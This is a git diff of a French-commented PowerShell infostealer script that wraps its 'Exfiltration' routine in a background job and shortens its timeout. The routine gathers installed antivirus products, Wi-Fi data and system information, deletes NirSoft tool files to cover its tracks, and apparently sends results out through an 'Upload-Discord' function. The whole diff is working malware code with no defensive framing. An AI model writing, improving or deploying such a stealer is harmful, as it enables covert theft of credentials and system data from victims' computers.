@@ -1,5 +1,5 @@
 # Définir la durée du délai en secondes
-$delaiEnSecondes = 120  # 2 minutes
+$delaiEnSecondes = 30  # 30 secs
 
 # Définir le moment où le délai expire
 $finDelai = (Get-Date).AddSeconds($delaiEnSecondes)
@@ -32,24 +32,23 @@ function Upload-Discord {
     }
 }
 
-# Boucle principale
-do {
-    function Exfiltration {
-        # Get desktop path
-        $desktop = [Environment]::GetFolderPath("Desktop")
+# Créer un scriptblock pour la fonction Exfiltration
+$ExfiltrationScript = {
+    # Get desktop path
+    $desktop = [Environment]::GetFolderPath("Desktop")
 
-        # Call version-av function
-        version-av
+    # Call version-av function
+    version-av
 
-        # Call Wifi function
-        Wifi
+    # Call Wifi function
+    Wifi
 
-        # Call SysInfo function
-        SysInfo
+    # Call SysInfo function
+    SysInfo
 
-        # Call the Del-Nirsoft-File function
-        Del-Nirsoft-File
-    }
+    # Call the Del-Nirsoft-File function
+    Del-Nirsoft-File
+}
 
     function version-av {
         Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8
@@ -123,8 +122,27 @@ do {
         rmdir -R \temp
     }
 
+# Lancer la fonction Exfiltration en arrière-plan
+$ExfiltrationJob = Start-Job -ScriptBlock $ExfiltrationScript
+
+# Boucle principale
+do {
     # Attendre une seconde avant de vérifier à nouveau
     Start-Sleep -Seconds 1
+
+    # Vérifier si le délai est écoulé
 } until (Delai-ecoule)
+
+# Attendre que le job Exfiltration soit terminé
+Wait-Job $ExfiltrationJob | Out-Null
+
+# Récupérer les résultats du job si nécessaire
+$ExfiltrationResults = Receive-Job $ExfiltrationJob
+
+# Afficher les résultats ou faire d'autres actions si nécessaire
+Write-Output "Exfiltration terminée : $($ExfiltrationResults | Out-String)"
+
+# Fermer le job
+Remove-Job $ExfiltrationJob
 
 exit
